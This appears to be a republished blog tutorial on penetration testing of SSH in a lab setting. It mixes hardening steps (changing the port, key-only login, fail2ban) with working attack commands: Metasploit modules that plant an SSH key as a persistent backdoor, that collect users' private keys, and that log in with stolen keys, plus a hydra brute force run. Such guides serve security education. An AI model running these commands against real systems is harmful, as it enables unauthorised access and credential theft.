---
title: 'SSH Penetration Testing (Port 22)'
date: 2020-01-12T07:06:00+01:00
draft: false
---

Probing through every open port is practically the first step hackers take in order to prepare their attack. And in order to work, one is required to keep their port open but at the same time, they are threatened by the fear of hackers. Therefore, one must learn to secure their ports even if they are open. In this post, we will discuss penetration testing of SSH which is also known as Secure Shell.

### Table of content

*   **Introduction to SSH**
*   **SSH Installation**
*   **SSH Port Scanning**
*   **Methods to Connect SSH**
    *   Terminal Command (Linux)
    *   Putty (Windows)
*   **Port Redirection**
*   **Port Redirection Testing**
*   **Establish SSH connection using RSA key**
*   **Exploit SSH with Metasploit**
    *   SSH Key Persistence- Post Exploitation
    *   Stealing the SSH key
    *   SSH login using pubkey
*   **SSH Password cracking**

### Introduction to SSH

The SSH protocol also stated to as Secure Shell is a technique for secure and reliable remote login from one computer to another. It offers several options for strong authentication, as it protects the connections and communications\\ security and integrity with strong encryption. It is a secure alternative to the non-protected login protocols (such as telnet, rlogin) and insecure file transfer methods (such as FTP).

### **SSH Installation**

It very easy to install and configure ssh service, we can directly install ssh service by using the openssh-server package from ubuntu repo. To install any service you must have root privilege account and then follow the given below command.

```
apt install openssh-server
```

when you will execute above command it will extract the package the install the default configure on the host machine. you can check open port with the help of netstat command on the host machine.

![](https://i1.wp.com/1.bp.blogspot.com/-69C-k0b1dOI/Xhqp1-wtACI/AAAAAAAAiMM/HqZ3ZtZlIb8l-GGLQDPzzrJSebSnvdooACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### SSH Port Scanning

If you don’t have direct access to the host machine, use nmap to remotely identify the port state that is considered to be the initial step of the penetration test. Here we’re going to use Kali Linux to perform a penetration testing.

So, to identify an open port on a remote network, we will use a version scan of the nmap that will not only identify an open port but will also perform a banner grabbing that shows the installed version of the service.

```
nmap -sV -p22 192.168.1.103
```

![](https://i2.wp.com/1.bp.blogspot.com/-gAkZ4WJE-iI/Xhqp4qUSY0I/AAAAAAAAiM0/GTzr2PiCjhU4WIRqKlHOtrtd7TOYglnVQCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### Methods to Connect SSH

### **Terminal Command (Linux)**

Now execute the following command to access the ssh shell of the remote machine as an authorized user. Username: ignite

**Password: 123**

```
ssh ignite@192.168.1.103
```

### ![](https://i1.wp.com/1.bp.blogspot.com/-BPQx17f52ek/Xhqp7iwuEAI/AAAAAAAAiNY/6Jtf_WJ0J2wN6uJKC3IyZtzxoRZnuq15wCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

### **Putty (Windows)**

**Step1:** Install putty.exe and run it, then enter the HOST IP address <192.168.1.103> and port <22>, also choose to connect type as SSH.

![](https://i0.wp.com/1.bp.blogspot.com/-YN_vPVztxpA/Xhqp8MqTSjI/AAAAAAAAiNc/w_vWognYq64XZh2wEYr6RbYyyNuMorKGACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

**Step2:** To establish a connection between the client and the server, a putty session will be generated that requires a login credential.

**Username: ignite**

**Password: 123**

![](https://i1.wp.com/1.bp.blogspot.com/-RRpL7rTc7mc/Xhqp8XJqJ_I/AAAAAAAAiNg/6A0xNBo9cR80hc3kPSoSTpFDOFkfaWP8ACLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

### Port Redirection

By default, ssh listen on port 22 which means if the attacker identifies port 22 is open then he can try attacks on port 22 in order to connect with the host machine. Therefore, a system admin chooses Port redirection or Port mapping by changing its default port to others in order to receive the connection request from the authorized network.

Follow the below steps for port redirection:

**Step1:** Edit the sshd\_config from inside the /etc/sshd using the editor

```
nano /etc/sshd/sshd\_config
```

![](https://i1.wp.com/1.bp.blogspot.com/-qNJuwhzvL3Y/Xhqp8elTOBI/AAAAAAAAiNk/98vcQn0IZuw03UG-LKwFYVeQ2xNLx8m_ACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

**Step2:** Change port 22 into 2222 and save the file.

**Step3**: Then restart ssh

![](https://i0.wp.com/1.bp.blogspot.com/-7KEsWoaXMi4/Xhqp9BO2syI/AAAAAAAAiNo/gZU32S3I9iAwMlFsNmiaFpzjpRfodZQlACLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

### **Port Redirection Testing**

Thus, when we have run the scan on port 22, it has shown port state CLOSE for ssh whereas port 2222 OPEN for ssh which can be seen the given image.

![](https://i1.wp.com/1.bp.blogspot.com/-3xCLU0QgJVU/Xhqp9cSoQUI/AAAAAAAAiNs/_kS6-qI-h6MLOfx6l5A3ooGmuhDMworDACLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

### **Establish SSH connection using RSA key**

Strong passwords don’t seem to be decent to secure the server because a brute force attack can crack them. That’s why you need an additional security method to secure the SSH server.

SSH key pairs is another necessary feature to authenticate clients to the server. It consists of a long string of characters: **a public** and **a private** key. You can place the public key on the server and private key on the client machine and unlock the server by connecting the private key of the client machine. Once the keys match up, the system permits you to automatically establish an SSH session without the need to type in a password.

Ssh-keygen is a tool for creating new authentication key pairs for SSH. Such key pairs are used for automating logins, single sign-on, and for authenticating hosts.

Thus, we will follow the steps for generating a key pair for authenticated connection.

**Step1:** Run the given command to generate an ssh key pair (id\_rsa and id\_rsa.pub) on the host machine Ubuntu.

```
ssh-keygen
```

![](https://i0.wp.com/1.bp.blogspot.com/-JOTnCh0t6lA/Xhqp9XAUvHI/AAAAAAAAiNw/cZ7leY8Gz6IN6ErlCOp0wwLSZZB_1e5HgCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

**Step2:** Same should be done on the client machine which is authorized to establish the connection with the host machine (ubuntu).

```
ssh-keygen
```

![](https://i0.wp.com/1.bp.blogspot.com/-JOTnCh0t6lA/Xhqp9XAUvHI/AAAAAAAAiNw/cZ7leY8Gz6IN6ErlCOp0wwLSZZB_1e5HgCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

**Step3:** Once the ssh key pair (id\_rsa and id\_rsa.pub) get generated then rename the id\_rsa.pub into authorized\_keys as show in the given image.

```
cat id\_rsa.pub > authorized\_keys
```

![](https://i1.wp.com/1.bp.blogspot.com/-lHeHmJMnj0A/Xhqp11eNr0I/AAAAAAAAiMQ/T7qdQ_BxMX4CJ6QiRgy0HgAeeU9DZvjPQCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

**Step4:** Share the authorized\_keys with the host machine by copying it into the .ssh directory.

![](https://i1.wp.com/1.bp.blogspot.com/-7FkUVAfUwkc/Xhqp2BAE9yI/AAAAAAAAiMU/IJNO_urEapIailu9io9tBu0DNo1PfDFzgCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

**Step5**: Edit the sshd\_config from inside the /etc/sshd using the editor

```
nano /etc/sshd/sshd\_config
```

![](https://i0.wp.com/1.bp.blogspot.com/--oILtK0Sx-4/Xhqp22d4eLI/AAAAAAAAiMY/5u3AvVqIHkY2n6_c7_MfW8iTvkgwAjyOgCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

**Step6:** Enable the “passwordauthentication no” comment

As a result of only the authorized machine which rsa key can establish a connection with the host machine without using password.

![](https://i0.wp.com/1.bp.blogspot.com/-rwABSDqPpqw/Xhqp3CzfraI/AAAAAAAAiMc/q3O3jzkHU6ENBe4nmZw7n9iBQuCl8JFkACLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

Now if you need to connect to the ssh server using your password username, the server will drop your connection request because it will authenticate the request that has authorized key.

![](https://i0.wp.com/1.bp.blogspot.com/-aSTIQN88_rY/Xhqp3TwX32I/AAAAAAAAiMg/TPQUW-cz8jwG-SChPnGZfYHQ4FM8scWtQCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

**Step7:** Copy the id\_rsa key from Kali Linux to the windows machine, to established connection using authorized keys on the windows machine,

**Step8:** Install puttygen.exe

**Step 9**: Run puttygen.exe and load the id\_rsa and “save as key” named as Key

![](https://i0.wp.com/1.bp.blogspot.com/-0FavWKAm41I/Xhqp3lVFhiI/AAAAAAAAiMk/h5P3XmyFUZ030CVoHpoeZB51UbRltobwgCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

**Step10:** Use putty.exe to connect with the host machine by entering hostname 192.168.1.103 and port 22.

**Step11:** Navigate to SSH >auth and browse the key private key that you have saved as mention in step 9.

![](https://i0.wp.com/1.bp.blogspot.com/-yyH4p5CArYg/Xhqp31XHlSI/AAAAAAAAiMo/7NpVWX2IdPw4BAFx_oUNsEv6WsXqHeKQACLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

This will establish an ssh connection between windows client and server without using a password.

### Exploit SSH with Metasploit

### **SSH Key Persistence- Post Exploitation**

Consider a situation, that by compromising the host machine you have obtained a meterpreter session and want to leave a permanent backdoor that will provide a reverse connection for next time.

This can be achieved with the help of the Metasploit module named “SSH Key Persistence-a post exploit” when port 22 is running on the host machine.

This module will add an SSH key to a specified user (or all), to allow remote login on the victim via SSH at any time.

```
use post/linux/manage/sshkey\_persistence  
msf post(sshkey\_persistence) > set session 1  
msf post(sshkey\_persistence) >exploit
```

As can be seen in the image given, it added authorized keys to /home / ignite/.ssh and stored a private key within /root/.msf4/loot

![](https://i0.wp.com/1.bp.blogspot.com/-t3Tk6dpx3Uc/Xhqp5cma8FI/AAAAAAAAiM4/j671UfFRBJMFY2XJc_7J_fKLuZJXUxPHwCLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

As we ensure this by connecting the host machine via port 22 using a private key generated above. Here I have renamed the private as “key” and gave permission 600.

```
chmod 600 key  
ssh -i key ignite@192.168.1.103
```

![](https://i0.wp.com/1.bp.blogspot.com/-mBYw5PJT8RI/Xhqp5W-QfiI/AAAAAAAAiM8/-c6eJ5dq51kd5MkNuLcPJd5rsGMADNIZwCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)

Bravo!! It works without any congestion and in this way, we can use ssh key as persistence backdoor.

### **Stealing the SSH key**

Consider a situation, that by compromising the host machine you have obtained a meterpreter session and port 22 is open for ssh and you want to steal SSH public key and authorized key. This can be done with the help Metasploit module named “Multi Gather OpenSSH PKI Credentials Collection -a post exploit” as discussed below.

This module will collect the contents of all users .ssh directories on the targeted machine. Additionally, known\_hosts and authorized\_keys and any other files are also downloaded. This module is largely based on firefox\_creds.rb.

```
use post/multi/gather/ssh\_creds  
msf post(ssh\_creds) >set session 1  
msf post(ssh\_creds) >exploit
```

From given below image you can see we have got all authorized keys store in /home/ignite/.ssh directory in our local machine at /root/.msf4/loot and now use those keys for login into an SSH server.

This can be done manually by downloading keys directly from inside /home/ignite/.ssh as shown in the below image.

![](https://i1.wp.com/1.bp.blogspot.com/-Eh3Pe50kx70/Xhqp5ZHvabI/AAAAAAAAiNA/KYaUVDIsifcyqNOqkKA2geCRb1nBXSP5gCLcBGAsYHQ/s1600/22.png?w=687&ssl=1)

As we ensure this by connecting the host machine via port 22 using private key downloaded above. Let’s change the permission for the rsa key and to do this follow the step given below.

```
chmod 600 key  
ssh -i key ignite@192.168.1.103
```

It works without any congestion and in this way, we can use ssh key as persistence backdoor.

![](https://i0.wp.com/1.bp.blogspot.com/-53RVoDPjGrs/Xhqp6PgApTI/AAAAAAAAiNE/1VipALSrkWs19bmrmMxzlq74cfbM9cOfwCLcBGAsYHQ/s1600/23.png?w=687&ssl=1)

### **SSH login using pubkey**

Considering you have id\_rsa key of the host machine and want to obtain meterpreter session via Metasploit and this can be achieved with the help of the following module.

This module will test ssh logins on a range of machines using a defined private key file and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. Key files may be a single private key or several private keys in a single directory.

```
use auxillary/scanner/ssh /ssh\_login\_pubkey  
auxiliary (scanner/ssh /ssh\_login\_pubkey)>set rhosts 192.168.1.103  
auxiliary (scanner/ssh /ssh\_login\_pubkey)>set username ignite  
auxiliary (scanner/ssh /ssh\_login\_pubkey)>set key\_path /root/.ssh/id\_rsa  
auxiliary (scanner/ssh /ssh\_login\_pubkey)>exploit
```

![](https://i0.wp.com/1.bp.blogspot.com/-svOPEUvwOsc/Xhqp6T7ypyI/AAAAAAAAiNI/E92CPAeh51gUU5FBhEEO2__hSCI7rbJhQCLcBGAsYHQ/s1600/24.png?w=687&ssl=1)

This will give a command session which can be further updated into the meterpreter session by executing the following command.

```
sessions -u 1
```

![](https://i0.wp.com/1.bp.blogspot.com/-9hG0VS-ZLJU/Xhqp6po3-hI/AAAAAAAAiNM/T1uapgoRfZIbF_WQJJbMF0_ao8GBA8X-ACLcBGAsYHQ/s1600/25.png?w=687&ssl=1)

### SSH Password cracking

We can test a brute force attack on ssh for guessing the password or to test threshold policy while performing penetration testing on SSH. It requires a dictionary for username list and password list, here we have username dictionary “user.txt” and password list named “pass.txt” to perform the brute force attack with the help of hydra

```
hydra -L user.txt -P pass.txt 192.168.1.103 ssh
```

![](https://i0.wp.com/1.bp.blogspot.com/-M2KV-oc4Y8Y/Xhqp7GRC6AI/AAAAAAAAiNQ/jdPypurFYqswjL9MqKAzksZaMH0IjuT7gCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)

As a result you can observe that the host machine has no defence against brute force attack, and we were able to obtain ssh credential.

To protect your service against brute force attack you can use fail2ban which is an IPS. Read more from [here](https://www.hackingarticles.in/defend-against-brute-force-attack-with-fail2ban/) to setup fail2ban IPS in the network.

If you will observe the given below image, then it can see here that this time the connection request drops by host machine when we try to launch a brute force attack.

![](https://i0.wp.com/1.bp.blogspot.com/-wFIEreQTcr4/Xhqp7YFk1_I/AAAAAAAAiNU/VoOFK-kgoDESLhEmIoYeNLBmB8CxSBPJgCLcBGAsYHQ/s1600/27.png?w=687&ssl=1)

**Conclusion:** In this post, we try to discuss the possible way to secure SSH and perform penetration testing against such a scenario.

**Author**: Nisha Sharma is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/nishasharmaa/?originalSubdomain=in)

The post [SSH Penetration Testing (Port 22)](https://www.hackingarticles.in/ssh-penetration-testing-port-22/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/35L68SP